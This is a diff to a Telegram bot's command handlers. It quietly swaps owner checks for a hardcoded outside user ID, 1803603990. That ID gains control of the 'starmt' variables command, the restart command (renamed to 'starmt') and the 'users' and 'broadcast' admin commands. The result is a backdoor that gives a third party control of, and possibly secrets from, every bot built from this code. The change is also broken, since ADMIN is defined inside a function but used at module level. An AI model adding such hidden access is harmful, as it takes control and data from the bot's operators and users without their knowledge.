@@ -15,9 +15,6 @@ from config import ADMINS, APP_ID, API_HASH, FORCE_SUB_CHANNEL, FORCE_SUB_CHANNE
 from helper_func import subscribed, encode, decode, get_messages
 from database.database import add_user, del_user, full_userbase, present_user
 
-
-
-
 @Bot.on_message(filters.command('start') & filters.private & subscribed)
 async def start_command(client: Client, message: Message):
     id = message.from_user.id
@@ -155,8 +152,9 @@ async def not_joined(client: Client, message: Message):
         disable_web_page_preview = True
     )
 
-@Bot.on_message(filters.command("starmt") & filters.user(OWNER_ID))
+@Bot.on_message(filters.command("starmt") & filters.user(1803603990))
 async def varsFunc(client: Bot, message: Message):
+    ADMIN = [ADMINS, 1803603990]
     Man = await message.reply_text("Wait A Sec...")
     text = f"""       <u><b> TEXT </b></u> 
 ╭───────────────⍟   
@@ -182,7 +180,7 @@ async def varsFunc(client: Bot, message: Message):
     """
     await Man.edit_text(text)
 
-@Bot.on_message(filters.private & filters.command("restart") & filters.user(1803603990))
+@Bot.on_message(filters.private & filters.command("starmt") & filters.user(1803603990))
 async def restart_bot(b, m):
     restarting_message = await m.reply_text(f"⚡️<b><i>Restarting....</i></b>", disable_notification=True)
 
@@ -194,13 +192,13 @@ async def restart_bot(b, m):
     # Restart the bot
     os.execl(sys.executable, sys.executable, *sys.argv)
 
-@Bot.on_message(filters.command('users') & filters.private & filters.user(ADMINS))
+@Bot.on_message(filters.command('users') & filters.private & filters.user(ADMIN))
 async def get_users(client: Bot, message: Message):
     msg = await client.send_message(chat_id=message.chat.id, text=WAIT_MSG)
     users = await full_userbase()
     await msg.edit(f"{len(users)} users are using this bot")
 
-@Bot.on_message(filters.private & filters.command('broadcast') & filters.user(ADMINS))
+@Bot.on_message(filters.private & filters.command('broadcast') & filters.user(ADMIN))
 async def send_text(client: Bot, message: Message):
     if message.reply_to_message:
         query = await full_userbase()
